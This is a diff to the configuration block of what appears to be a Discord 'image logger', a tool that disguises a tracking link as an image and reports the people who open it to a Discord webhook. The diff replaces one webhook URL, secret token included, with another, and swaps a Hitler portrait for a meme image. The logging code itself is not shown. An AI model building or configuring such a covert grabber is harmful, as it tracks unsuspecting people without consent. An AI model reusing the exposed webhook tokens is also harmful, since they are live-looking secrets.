@@ -12,8 +12,8 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1428055651984343061/hfIdsLajbvx6xQC29QsRFrBwF6tMjAvjFozErn-e8Zmy6CTNtO3Q1W_1YeTwKsd5yAVS",
-    "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/Hitler_portrait_crop.jpg/960px-Hitler_portrait_crop.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1428474834257445025/9KsvALRQ1sU4nTs1fUqioTeYGP1o2pg3MgOzuFQevTEVNTQGiYwu4spqDoQ3GIoGWhXl",
+    "image": "https://images3.memedroid.com/images/UPLOADED407/58f2bf9c848a7.jpeg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
